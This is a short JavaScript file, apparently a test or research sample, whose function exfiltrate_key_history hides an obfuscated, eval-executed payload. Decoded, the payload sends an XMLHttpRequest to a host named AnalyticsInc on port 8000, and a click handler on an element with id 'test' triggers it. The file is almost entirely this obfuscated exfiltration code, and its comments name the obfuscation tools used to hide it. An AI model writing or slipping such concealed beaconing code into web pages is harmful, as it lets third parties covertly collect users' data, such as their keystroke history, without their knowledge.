function exfiltrate_key_history() {

    // http://www.daftlogic.com/projects-online-javascript-obfuscator.htm + http://javascriptobfuscator.com/
    // Exfiltrate data using XMLHTTP request
    var _0x1636=["\x30\x3D\x35\x20\x34\x28\x29\x3B\x30\x2E\x37\x28\x22\x33\x22\x2C\x22\x31\x3A\x2F\x2F\x32\x3A\x36\x2F\x38\x2E\x64\x3F\x63\x3D\x62\x22\x2C\x39\x29\x3B\x30\x2E\x61\x28\x65\x29\x3B","\x7C","\x73\x70\x6C\x69\x74","\x78\x6D\x6C\x68\x74\x74\x70\x7C\x68\x74\x74\x70\x7C\x41\x6E\x61\x6C\x79\x74\x69\x63\x73\x49\x6E\x63\x7C\x47\x45\x54\x7C\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x7C\x6E\x65\x77\x7C\x38\x30\x30\x30\x7C\x6F\x70\x65\x6E\x7C\x73\x75\x62\x6D\x69\x73\x73\x69\x6F\x6E\x7C\x74\x72\x75\x65\x7C\x73\x65\x6E\x64\x7C\x6D\x75\x6C\x74\x69\x7C\x74\x65\x73\x74\x7C\x68\x74\x6D\x6C\x7C\x6E\x75\x6C\x6C","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"]
    eval(function (_0x9e37x1,_0x9e37x2,_0x9e37x3,_0x9e37x4,_0x9e37x5,_0x9e37x6)
    {
        _0x9e37x5=function (_0x9e37x3)
        {
            return _0x9e37x3.toString(36)
        }
        ;
        if(!_0x1636[5][_0x1636[4]](/^/,String))
        {
            while(_0x9e37x3--)
            {
                _0x9e37x6[_0x9e37x3.toString(_0x9e37x2)]=_0x9e37x4[_0x9e37x3]||_0x9e37x3.toString(_0x9e37x2);
            }
            _0x9e37x4=[function (_0x9e37x5)
            {
                return _0x9e37x6[_0x9e37x5]
            }
            ];
            _0x9e37x5=function ()
            {
                return _0x1636[6]
            }
            ;
            _0x9e37x3=1;
        }
        ;
        while(_0x9e37x3--)
        {
            if(_0x9e37x4[_0x9e37x3])
            {
                _0x9e37x1=_0x9e37x1[_0x1636[4]]( new RegExp(_0x1636[7]+_0x9e37x5(_0x9e37x3)+_0x1636[7],_0x1636[8]),_0x9e37x4[_0x9e37x3]);
            }
        }
        return _0x9e37x1
    }
    (_0x1636[0],15,15,_0x1636[3][_0x1636[2]](_0x1636[1]),0,{}));

}

document.getElementById('test').onclick = exfiltrate_key_history;
